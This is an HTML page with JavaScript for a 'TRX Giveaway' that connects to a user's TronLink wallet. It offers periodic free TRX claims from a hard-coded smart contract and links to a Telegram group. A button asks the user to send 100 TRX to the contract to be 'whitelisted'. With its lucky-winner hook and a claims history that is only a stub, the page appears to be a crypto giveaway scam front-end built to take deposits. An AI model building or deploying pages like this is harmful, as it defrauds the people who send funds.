<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TRX Giveaway</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            text-align: center;
        }
        .container {
            width: 80%; 
            margin: auto; 
            padding-top: 50px;
        }
        .button { 
            padding: 10px 20px; 
            background-color: #4CAF50; 
            color: white; 
            border: none; 
            border-radius: 5px; 
            cursor: pointer; 
            margin-top: 20px;
        }
        .button:disabled, .button.connected { 
            background-color: #ccc;
        }
        #status, #claimAmount {
            margin-top: 20px;
        }
        ul {
            list-style-type: none;
            padding: 0;
        }
        li {
            background-color: #f4f4f4;
            border: 1px solid #ddd;
            margin-top: 5px;
            padding: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>TRX Giveaway</h1>
        <p>One wallet can claim TRX every <span id="claimInterval">120</span> minutes. Will you be the lucky one?</p>
        <button id="connectWalletButton" class="button">Connect TronLink Wallet</button>
        <button id="claimButton" class="button" disabled>Claim TRX</button>
        <button id="depositButton" class="button" disabled>Deposit TRX to Whitelist</button>
        <p id="status">Please connect your TronLink wallet.</p>
        <p id="claimAmount">Available TRX to Claim: --</p>
        <div>
            <h2>Latest Claims</h2>
            <ul id="claimsHistory"></ul>
        </div>
        <a href="https://t.me/claimyourtrx">Join our Telegram group</a>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/tronweb.min.js"></script>
    <script>
        let contractInstance;
        const contractAddress = 'TJJdgJtiGPKNxwa4xWKKUb4YZWLTGH9tos';
        const connectWalletButton = document.getElementById('connectWalletButton');
        const claimButton = document.getElementById('claimButton');
        const depositButton = document.getElementById('depositButton');
        const statusText = document.getElementById('status');
        const claimAmountText = document.getElementById('claimAmount');
        const claimsHistory = document.getElementById('claimsHistory');

        async function initContractInstance() {
            if (typeof(window.tronWeb) === 'undefined') {
                statusText.innerText = 'TronLink is not installed!';
                return;
            }
            try {
                contractInstance = await window.tronWeb.contract().at(contractAddress);
                statusText.innerText = 'Contract loaded successfully';
                claimButton.disabled = false;
                depositButton.disabled = false;
                updateUI();
            } catch (error) {
                console.error("Error initializing contract instance:", error);
                statusText.innerText = 'Error loading the contract.';
            }
        }

        async function claimTRX() {
            try {
                const result = await contractInstance.claimTRX().send({
                    shouldPollResponse: true
                });
                statusText.innerText = 'TRX claimed successfully!';
                updateClaimsHistory();
            } catch (error) {
                console.error("Error claiming TRX:", error);
                statusText.innerText = 'Failed to claim TRX.';
            }
        }

        async function depositToWhitelist() {
            const depositAmount = window.tronWeb.toSun(100); // Equivalent to 100 TRX
            try {
                const result = await contractInstance.depositToWhitelist().send({
                    callValue: depositAmount,
                    shouldPollResponse: true
                });
                statusText.innerText = 'Deposit successful, you are now whitelisted!';
            } catch (error) {
                console.error("Error depositing to whitelist:", error);
                statusText.innerText = 'Failed to deposit TRX.';
            }
        }

        function updateUI() {
            setInterval(async () => {
                const claimInterval = await contractInstance.claimInterval().call();
                document.getElementById('claimInterval').innerText = claimInterval / 60; // Convert seconds to minutes
            }, 1000);
        }

        function updateClaimsHistory() {
            // This would need to fetch the latest claims from the blockchain or an event listener
        }

        connectWalletButton.addEventListener('click', initContractInstance);
        claimButton.addEventListener('click', claimTRX);
        depositButton.addEventListener('click', depositToWhitelist);

        window.onload = () => {
            statusText.innerText = 'Checking if TronLink is installed...';
            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                initContractInstance();
            }
        };
    </script>
</body>
</html>
